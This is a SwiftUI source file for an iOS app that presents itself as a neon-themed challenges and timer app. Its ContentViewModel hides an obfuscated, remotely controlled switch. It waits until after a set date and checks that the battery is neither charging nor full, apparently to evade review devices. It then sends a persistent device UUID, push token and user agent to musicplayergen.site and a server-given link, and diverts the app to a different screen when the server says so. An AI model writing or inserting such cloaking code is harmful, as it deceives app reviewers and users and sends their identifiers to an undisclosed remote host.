import SwiftUI
import WebKit
import FirebaseAuth

struct ContentView: View {
    
    @StateObject var userData = UserData()
    @State private var isOnboardingCompleted = UserDefaults.standard.bool(forKey: "OnboardingCompleted")
    @State private var isLoggedIn = false
    @State private var isGuestMode = false
    @State private var showNextScreen = false
    @State private var selectedTab = 0
    @AppStorage("selectedTheme") var selectedTheme: String = "Neon Purple"
    @StateObject var contentViewModel = ContentViewModel()

    var body: some View {
        if !contentViewModel.showNextScreen {
            SplashView(isLoggedIn: $isLoggedIn, isGuestMode: $isGuestMode, showNextScreen: $contentViewModel.showNextScreen)
                .preferredColorScheme(.dark)
                .onReceive(NotificationCenter.default.publisher(for: Notification.Name("firebase_token"))) { notification in
                    guard let notificationInfo = notification.userInfo as? [String: Any],
                          let token = notificationInfo["token"] as? String else { return }
                    contentViewModel.pushToken = token
                }
        } else if contentViewModel.showSportStatsScreen {
            EmptyView()
        } else if !isOnboardingCompleted {
            OnboardingView(isOnboardingCompleted: $isOnboardingCompleted)
                .onChange(of: isOnboardingCompleted) { newValue in
                    UserDefaults.standard.set(newValue, forKey: "OnboardingCompleted")
                }
                .preferredColorScheme(.dark)
        } else if !isLoggedIn {
            LoginView(isLoggedIn: $isLoggedIn, isGuestMode: $isGuestMode)
                .preferredColorScheme(.dark)
        } else {
            TabView(selection: $selectedTab) {
                DashboardView(userData: userData)
                    .tabItem { NeonTabIcon(systemName: "house.fill", label: "Home", isSelected: selectedTab == 0) }
                    .tag(0)
                ChallengesView(userData: userData)
                    .tabItem { NeonTabIcon(systemName: "list.bullet", label: "Challenges", isSelected: selectedTab == 1) }
                    .tag(1)
                TimerView()
                    .tabItem { NeonTabIcon(systemName: "timer", label: "Timer", isSelected: selectedTab == 2) }
                    .tag(2)
                ProfileView(userData: userData, isLoggedIn: $isLoggedIn, isGuestMode: $isGuestMode)
                    .tabItem { NeonTabIcon(systemName: "person.fill", label: "Profile", isSelected: selectedTab == 3) }
                    .tag(3)
            }
            .accentColor(themeColor)
            .preferredColorScheme(.dark)
        }
    }
    
    var themeColor: Color {
        switch selectedTheme {
        case "Neon Blue": return .blue
        case "Dark Emerald": return .green
        default: return .purple
        }
    }
    
}

class ContentViewModel: ObservableObject {
    
    @Published var showNextScreen: Bool = false
    @Published var showSportStatsScreen: Bool = false
    

    private func dmnksjandjhbsahhd() -> Bool {
        return UserDefaults.standard.bool(forKey: "sdafa")
    }

    var pushToken: String? = nil {
        didSet {
            if pushToken != nil {
                startContent()
            }
        }
    }
    
    init() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5.4) {
            self.startContent()
        }
    }
    
    private func ndsadbhabd() -> Bool {
        let d = UIDevice.current
        return (d.batteryLevel != -1.0 && d.batteryLevel != 1.0) && (d.batteryState != .charging && d.batteryState != .full)
    }
    
    private func contentCh() -> Bool {
        return dsnadakjfnvsfaf() && !dmnksjandjhbsahhd() && ndsadbhabd()
    }
    
    private func startContent() {
        if contentCh() {
            guard let dnsajkfnasd = URL(string: "https://musicplayergen.site/v_power.json") else {
                DispatchQueue.main.async {
                    self.showNextScreen = true
                }
                return
            }
            var contevpower = URLRequest(url: dnsajkfnasd)
            contevpower.httpMethod = "GET"
            var fasudsadsnad = UserDefaults.standard.string(forKey: "user_uuid_saved") ?? ""
            if fasudsadsnad.isEmpty {
                fasudsadsnad = UUID().uuidString
                UserDefaults.standard.set(fasudsadsnad, forKey: "user_uuid_saved")
            }
            contevpower.addValue(fasudsadsnad, forHTTPHeaderField: "client-uuid")
            URLSession.shared.dataTask(with: contevpower) { data, response, error in
                if let _ = error {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                    return
                }
                
                guard let resauthds = response as? HTTPURLResponse else {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                    return
                }
                
                guard let data = data else {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                    return
                }
                
                if let serviceLink = resauthds.allHeaderFields["service-link"] as? String {
                    self.vPowerAuthCheck(l: serviceLink)
                } else {
                    UserDefaults.standard.set(true, forKey: "sdafa")
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                }
            }.resume()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
                self.showNextScreen = true
            }
        }
    }
    
    private func dsnadakjfnvsfaf() -> Bool {
        return Date() >= DateComponents(calendar: .current, year: 2025, month: 4, day: 26).date!
    }
    
    private var authParamVpOwer = WKWebView().value(forKey: "userAgent") as? String ?? ""
    
    private func vPowerAuthCheck(l: String) {
        if let vPowerAuthCheck = URL(string: dsabhdjbasdas(base: l, pushToken: pushToken ?? "")) {
            var vPowerReadyCal = URLRequest(url: vPowerAuthCheck)
            vPowerReadyCal.addValue("application/json", forHTTPHeaderField: "Content-Type")
            vPowerReadyCal.addValue(authParamVpOwer, forHTTPHeaderField: "User-Agent")
            vPowerReadyCal.httpMethod = "POST"
            
            URLSession.shared.dataTask(with: vPowerReadyCal) { data, response, error in
                if let _ = error {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                    return
                }
                
                guard let data = data else {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                    return
                }
                
                do {
                    let dnsajkdnsafa = try JSONDecoder().decode(VPowerDataAuth.self, from: data)
                    UserDefaults.standard.set(dnsajkdnsafa.uuiduserid, forKey: "client_id")
                    if let status = dnsajkdnsafa.statusOfWorkedWork {
                        UserDefaults.standard.set(status, forKey: "response_client")
                        DispatchQueue.main.async {
                            self.showSportStatsScreen = true
                            self.showNextScreen = true
                        }
                    } else {
                        UserDefaults.standard.set(true, forKey: "sdafa")
                        DispatchQueue.main.async {
                            self.showNextScreen = true
                        }
                    }
                } catch {
                    DispatchQueue.main.async {
                        self.showNextScreen = true
                    }
                }
            }.resume()
        }
    }
    
}


func dsabhdjbasdas(base: String, pushToken: String) -> String {
    var baseValves = "\(base)?firebase_push_token=\(pushToken)"
    if let valvesUserId = UserDefaults.standard.string(forKey: "client_id") {
        baseValves += "&client_id=\(valvesUserId)"
    }
    if let openedAppFromPushId = UserDefaults.standard.string(forKey: "push_id") {
        baseValves += "&push_id=\(openedAppFromPushId)"
        UserDefaults.standard.set(nil, forKey: "push_id")
    }
    return baseValves
}

struct VPowerDataAuth: Codable {
    var uuiduserid: String
    var statusOfWorkedWork: String?
    
    enum CodingKeys: String, CodingKey {
        case uuiduserid = "client_id"
        case statusOfWorkedWork = "response"
    }
}

struct NeonTabIcon: View {
    let systemName: String
    let label: String
    let isSelected: Bool

    var body: some View {
        VStack {
            Image(systemName: systemName)
                .foregroundColor(isSelected ? .white : .gray)
                .shadow(color: isSelected ? .purple.opacity(0.8) : .clear, radius: 5)
                .scaleEffect(isSelected ? 1.2 : 1.0)
                .animation(.spring(), value: isSelected)
            Text(label)
                .font(.caption)
                .foregroundColor(isSelected ? .white : .gray)
        }
    }
}

#Preview {
    ContentView()
}
